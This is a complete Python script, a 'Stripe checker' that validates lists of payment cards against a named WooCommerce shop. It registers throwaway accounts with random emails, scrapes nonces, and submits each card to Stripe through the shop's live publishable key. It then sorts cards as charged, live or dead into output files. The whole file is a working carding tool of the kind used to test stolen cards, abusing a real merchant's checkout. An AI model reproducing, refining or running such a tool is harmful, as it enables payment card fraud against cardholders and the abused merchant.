"""
WayuuMarket Stripe Checker v3.0 for Pydroid3
"""
import requests
import random
import string
import uuid
import time
import os
import re
import json

INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3

def log(msg):
    print(f"[DEBUG] {msg}")

def randmail():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def get_bin(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','').upper()} | {d.get('bank',{}).get('name','')} | {d.get('country',{}).get('name','')}"
    except:
        pass
    return cc[:6]

def check_card(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    s = requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    
    # Step 1: Get registration page
    log("Getting registration page...")
    r = s.get('https://wayuumarket.com/my-account/', timeout=30)
    
    m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
    if not m:
        return 'ERROR', 'No register nonce'
    
    reg_nonce = m.group(1)
    log(f"Register nonce: {reg_nonce}")
    
    # Step 2: Register
    email = randmail()
    log(f"Registering: {email}")
    
    r = s.post('https://wayuumarket.com/my-account/', data={
        'email': email,
        'woocommerce-register-nonce': reg_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }, timeout=30)
    
    if 'log out' in r.text.lower() or 'dashboard' in r.text.lower():
        log("Registered!")
    else:
        log("Registration might have failed")
    
    # Step 3: Get add-payment-method page
    log("Getting add-payment-method page...")
    r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
    html = r.text
    
    # Find the createSetupIntentNonce specifically
    setup_nonce = None
    
    # Try to find wc_stripe_params JSON
    params_match = re.search(r'var\s+wc_stripe_params\s*=\s*(\{.*?\});', html, re.DOTALL)
    if params_match:
        try:
            # Clean up the JSON
            params_text = params_match.group(1)
            # Find createSetupIntentNonce in it
            nonce_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params_text)
            if nonce_match:
                setup_nonce = nonce_match.group(1)
                log(f"Found createSetupIntentNonce: {setup_nonce}")
        except:
            pass
    
    # Try other patterns
    if not setup_nonce:
        patterns = [
            r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
            r'createSetupIntentNonce["\s:]+["\']([^"\']+)',
            r'"create_setup_intent_nonce"\s*:\s*"([^"]+)"',
        ]
        for p in patterns:
            m = re.search(p, html)
            if m:
                setup_nonce = m.group(1)
                log(f"Found setup nonce: {setup_nonce}")
                break
    
    if not setup_nonce:
        log("No setup intent nonce found, trying PM only")
    
    # Step 4: Create Payment Method
    log(f"Creating PM...")
    
    guid = str(uuid.uuid4())
    
    pm_resp = requests.post('https://api.stripe.com/v1/payment_methods',
        headers={
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        },
        data={
            'type': 'card',
            'billing_details[name]': 'John Smith',
            'billing_details[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': guid,
            'sid': guid,
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
            'referrer': 'https://wayuumarket.com',
            'time_on_page': str(random.randint(50000, 150000)),
            'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
        },
        timeout=30
    ).json()
    
    log(f"PM response: {str(pm_resp)[:100]}")
    
    # Check PM errors
    if 'error' in pm_resp:
        err = pm_resp['error']
        code = err.get('decline_code') or err.get('code', '')
        msg = err.get('message', '')
        
        ccn_codes = ['incorrect_cvc', 'invalid_cvc', 'insufficient_funds', 'generic_decline',
                     'expired_card', 'lost_card', 'stolen_card', 'do_not_honor', 
                     'card_velocity_exceeded', 'pickup_card', 'restricted_card']
        
        if code in ccn_codes:
            return 'CCN', code
        
        return 'DEAD', code or msg[:40]
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    log(f"PM created: {pm_id}")
    
    # Step 5: Create Setup Intent (if we have nonce)
    if setup_nonce:
        log(f"Creating setup intent...")
        
        setup_resp = s.post(
            'https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent',
            headers={
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://wayuumarket.com',
                'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
                'x-requested-with': 'XMLHttpRequest',
            },
            data={
                'stripe_source_id': pm_id,
                'nonce': setup_nonce,
            },
            timeout=30
        )
        
        log(f"Setup response: {setup_resp.text[:150]}")
        
        try:
            j = setup_resp.json()
            
            if j.get('success') == True:
                return 'CHARGED', 'Card Added Successfully!'
            
            if j.get('status') == 'succeeded':
                return 'CHARGED', 'Setup Succeeded!'
            
            if j.get('status') == 'requires_action':
                return 'CCN', '3DS Required'
            
            err = j.get('error', {})
            if isinstance(err, dict):
                err_msg = err.get('message', '')
            else:
                err_msg = str(err)
            
            if 'verify your request' in err_msg.lower():
                # Nonce issue - fall back to PM result
                log("Nonce invalid, using PM result")
                return 'LIVE', f'PM Created ({pm_resp.get("card",{}).get("brand","").upper()})'
            
            if any(x in err_msg.lower() for x in ['cvc', 'decline', 'insufficient', 'lost', 'stolen']):
                return 'CCN', err_msg[:30]
            
            if 'authentication' in err_msg.lower() or '3d' in err_msg.lower():
                return 'CCN', '3DS Required'
            
        except:
            pass
    
    # PM was created = card is valid
    brand = pm_resp.get('card', {}).get('brand', 'unknown').upper()
    return 'LIVE', f'PM Created ({brand})'

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET STRIPE CHECKER v3.0    ║
    ║           FOR PYDROID3                ║
    ║     WooCommerce Setup Intent Gate     ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("[!] No cards")
        return
    
    print(f"[*] Cards: {len(cards)}")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 45)
    
    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0}
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status in ['CHARGED', 'CCN', 'LIVE']:
            symbol = 'CHARGED' if status == 'CHARGED' else ('CCN' if status == 'CCN' else 'LIVE')
            print(f"[{symbol}] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats[status.lower()] = stats.get(status.lower(), 0) + 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|{status}|{msg}\n")
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            stats['dead'] += 1
            with open(DEAD_FILE, 'a') as f:
                f.write(f"{full}|{msg}\n")
        
        print(f"[*] {t}s")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 45)
    print(f"CHARGED: {stats.get('charged',0)} | CCN: {stats.get('ccn',0)} | LIVE: {stats.get('live',0)} | DEAD: {stats['dead']}")

if __name__ == "__main__":
    main()
